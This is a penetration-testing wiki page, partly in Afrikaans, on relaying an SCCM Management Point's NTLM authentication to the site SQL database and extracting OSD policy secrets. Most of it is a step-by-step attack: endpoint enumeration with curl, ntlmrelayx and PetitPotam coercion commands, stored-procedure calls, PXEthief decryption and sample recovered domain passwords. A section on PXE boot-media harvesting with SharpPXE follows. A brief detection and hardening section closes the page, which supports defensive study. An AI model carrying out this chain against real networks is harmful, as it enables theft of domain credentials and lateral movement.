# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Deur ’n **System Center Configuration Manager (SCCM) Management Point (MP)** te dwing om oor SMB/RPC te authenticate en daardie NTLM-masjienrekening na die **site database (MSSQL)** te **relay**, verkry jy `smsdbrole_MP` / `smsdbrole_MPUserSvc`-regte. Hierdie rolle laat jou toe om ’n stel stored procedures te roep wat **Operating System Deployment (OSD)**-policy blobs blootlê (Network Access Account credentials, Task-Sequence variables, ens.). Die blobs is hex-encoded/encrypted, maar kan met **PXEthief** decoded en decrypted word, wat plaintext secrets lewer.<sup>[[2]](#references)</sup>

Hoëvlak-ketting:
1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Through the SOCKS proxy connect with `mssqlclient.py -windows-auth` as the relayed **<DOMAIN>\\<MP-host>$** account.
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets such as `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. are recovered without touching PXE or clients.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerating unauthenticated MP endpoints
Die MP ISAPI extension **GetAuth.dll** stel verskeie parameters bloot wat nie authentication vereis nie (tensy die site PKI-only is):<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Returns site signing cert public key + GUIDs of *x86* / *x64* **All Unknown Computers** devices. |
| `MPLIST` | Lists every Management-Point in the site. |
| `SITESIGNCERT` | Returns Primary-Site signing certificate (identify the site server without LDAP). |

Kry die GUIDs wat as die **clientID** vir latere DB queries sal optree:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Herlei die MP-masjienrekening na MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Wanneer die coercion geaktiveer word, behoort jy iets soos die volgende te sien:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifiseer OSD-beleide via gestoorde prosedures
Koppel deur die SOCKS-proxy (poort 1080 by verstek):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Skakel oor na die **CM_<SiteCode>** DB (gebruik die 3-syfer-site code, bv. `CM_001`).

### 3.1 Vind Unknown-Computer GUIDs (opsioneel)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Lys toegewysde beleide
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Elke ry bevat `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Fokus op beleide:
* **NAAConfig**  – Network Access Account-geloofsbriewe
* **TS_Sequence** – Task Sequence-veranderlikes (OSDJoinAccount/Password)
* **CollectionSettings** – Kan run-as-rekeninge bevat

### 3.3  Haal volledige body op
As jy reeds `PolicyID` & `PolicyVersion` het, kan jy die clientID-vereiste oorslaan deur:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> BELANGRIK: Verhoog “Maximum Characters Retrieved” in SSMS (>65535), anders sal die blob afgekap word.

---

## 4. Decode & decrypt die blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Voorbeeld van herwonne geheime:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevant SQL roles & procedures
Na relay word die login gekarteer na:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Hierdie roles stel dosyne EXEC-permissions bloot; die belangrikste wat in hierdie aanval gebruik word, is:

| Stored Procedure | Doel |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Lys die beleide wat op ’n `clientID` toegepas word. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Gee die volledige policy body terug. |
| `MP_GetListOfMPsInSiteOSD` | Word deur die `MPKEYINFORMATIONMEDIA`-path teruggestuur. |

Jy kan die volledige lys inspekteer met:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **PXE reply over UDP/4011**: stuur ’n PXE boot request na ’n Distribution Point wat vir PXE gekonfigureer is. Die proxyDHCP response onthul boot paths soos `SMSBoot\\x64\\pxe\\variables.dat` (encrypted config) en `SMSBoot\\x64\\pxe\\boot.bcd`, plus ’n opsionele encrypted key blob.<sup>[[4]](#references)</sup>
* **Retrieve boot artifacts via TFTP**: gebruik die teruggestuurde paths om `variables.dat` oor TFTP af te laai (unauthenticated). Die file is klein (’n paar KB) en bevat die encrypted media variables.
* **Decrypt or crack**:
- Indien die response die decryption key insluit, voer dit aan **SharpPXE** om `variables.dat` direk te decrypt.
- Indien geen key verskaf word nie (PXE media beskerm deur ’n custom password), genereer SharpPXE ’n **Hashcat-compatible** `$sccm$aes128$...` hash vir offline cracking. Nadat die password recovered is, decrypt die file.
* **Parse decrypted XML**: plaintext variables bevat SCCM deployment metadata (**Management Point URL**, **Site Code**, media GUIDs en ander identifiers). SharpPXE parse dit en druk ’n gereed-om-te-loop **SharpSCCM** command met GUID/PFX/site parameters wat vooraf ingevul is vir verdere abuse.
* **Requirements**: slegs network reachability na die PXE listener (UDP/4011) en TFTP; geen local admin privileges is nodig nie.

---

## 7. Detection & Hardening
1. **Monitor MP logins** – enige MP computer account wat vanaf ’n IP aanmeld wat nie sy host is nie ≈ relay.<sup>[[1]](#references)</sup>
2. Enable **Extended Protection for Authentication (EPA)** op die site database (`PREVENT-14`).
3. Disable unused NTLM, enforce SMB signing, restrict RPC (
dieselfde mitigations wat teen `PetitPotam`/`PrinterBug` gebruik word).
4. Harden MP ↔ DB communication met IPSec / mutual-TLS.
5. **Constrain PXE exposure** – firewall UDP/4011 en TFTP tot trusted VLANs, require PXE passwords, en alert op TFTP downloads van `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Sien ook
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL misbruik & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## References
- [1] [Ek wil graag met jou bestuurder praat: Secrets steel met Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
